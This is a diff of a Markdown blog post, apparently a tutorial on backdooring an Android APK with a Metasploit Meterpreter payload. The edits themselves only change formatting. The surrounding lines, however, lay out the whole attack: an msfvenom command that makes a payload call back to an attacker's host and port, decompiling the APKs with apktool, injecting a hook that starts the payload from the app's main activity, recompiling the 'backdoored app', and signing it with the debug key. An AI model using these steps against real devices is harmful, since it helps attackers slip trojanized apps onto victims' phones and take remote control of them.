@@ -51,7 +51,7 @@ That's about it. I will also show you how can you get a working Meterpreter sess
 
 ### Step 1: Generate the Payload
 
-First of all, we have to make the Meterpreter payload. We are going to use MSFVenom for this. The command is-
+First of all, we have to make the Meterpreter payload. We are going to use MSFVenom for this. The command is
 ```console
 $ msfvenom -p android/meterpreter/[Payload_Type] LHOST=[IP_Address] LPORT=[Incoming_Port] -o meterpreter.apk
 ```
@@ -83,7 +83,7 @@ So run the command using replacing the keywords with appropriate values and MSFV
 
 ### Step 2: Decomplile the APKs
 
-Now we have to decompile the APKs, for this we are going to use APKTool. It decompiles the code to a fairly human-readable format and saves it in .smali files, and also successfully extracts the .xml files. Assuming you have already installed the latest apktool and also have the original apk file in the root directory, run the following commands -
+Now we have to decompile the APKs, for this we are going to use APKTool. It decompiles the code to a fairly human-readable format and saves it in .smali files, and also successfully extracts the .xml files. Assuming you have already installed the latest apktool and also have the original apk file in the root directory, run the following commands
 ```console
 $ apktool d -f -o payload /root/meterpreter.apk
 $ apktool d -f -o original /root/[Original_APK_Name] 
@@ -104,7 +104,7 @@ In the previous step, we just copied the payload codes inside the original apk, 
 
 For this, firstly we have to find out which activity (to put it simply, activities are sections of code, it's similar to frames in windows programming) is run when the app is launched. We can get this info from the AndroidManifest.xml file.
 
-So open up the AndroidManifest.xml file located inside the "/root/original" folder using any text editor. If you know HTML, then this file will look familiar to you. Both of them are essentially Markup Languages, and both use the familiar tags and attributes structure (e.g. <tag attribute="value"> Content </tag>). Anyway, look for an <activity> tag which contains both the lines -
+So open up the AndroidManifest.xml file located inside the "/root/original" folder using any text editor. If you know HTML, then this file will look familiar to you. Both of them are essentially Markup Languages, and both use the familiar tags and attributes structure, e.g. `<tag attribute="value"> Content </tag>`. Anyway, look for an `<activity>` tag which contains both the lines
 
 ```    
 <action android:name="android.intent.action.MAIN"/>
@@ -117,7 +117,7 @@ On a side note, you can use CTRL+F to search within the document in any GUI text
 
 Those two lines we searched for signifies that this is the activity which is going to start when we launch the app from the launcher icon, and also this is a MAIN activity (similar to the 'main' function in traditional programming).
 
-Now that we have the name of the activity we want to inject the hook into, let's get to it! First of all, open the .smali code of that activity using gedit. Just open a terminal and type -
+Now that we have the name of the activity we want to inject the hook into, let's get to it! First of all, open the .smali code of that activity using gedit. Just open a terminal and type
 ```console
 $ gedit /root/original/smali/[Activity_Path]
 ```
@@ -126,12 +126,12 @@ Replace the [Activity_Path] with the activity's "android:name", but instead of t
 
 ![Screenshot from 2015-12-19 19:06:17](/images/posts/screenshot-from-2015-12-19-190617.png)
 
-Now search for the following line in the smali code (using CTRL+F) -
+Now search for the following line in the smali code (using CTRL+F)
 ```
 ;->onCreate(Landroid/os/Bundle;)V
 ```
 
-When you locate it, paste the following code in the line next to it -
+When you locate it, paste the following code in the line next to it
 ```
 invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
 ```
@@ -160,9 +160,9 @@ After adding the additional ones from the Payload's AndroidManifest, my /root/or
 ### Step 6: Recompile The Original APK
 
 
-Now the hard parts are all done! We just have to recompile the backdoored app into an installable apk. Run the following command -
+Now the hard parts are all done! We just have to recompile the backdoored app into an installable apk. Run the following command
 ```console
-apktool b /root/original
+$ apktool b /root/original
 ```
 
 ![Screenshot from 2015-12-19 20:14:31](/images/posts/screenshot-from-2015-12-19-201431.png)
@@ -177,10 +177,10 @@ This is also a very important step, as in most of the cases, an unsigned apk can
     
 > Android requires that all apps be digitally signed with a certificate before they can be installed. Android uses this certificate to identify the author of an app, and the certificate does not need to be signed by a certificate authority. Android apps often use self-signed certificates. The app developer holds the certificate's private key.
 
-In this case we are going to sign the apk using the default android debug key. Just run the following command -
+In this case we are going to sign the apk using the default android debug key. Just run the following command
 
 ```console
-jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA [apk_path] androiddebugkey
+$ jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA [apk_path] androiddebugkey
 ```
 
 Be sure to replace the [apk_path] in the above command with the path to your backdoored apk file.
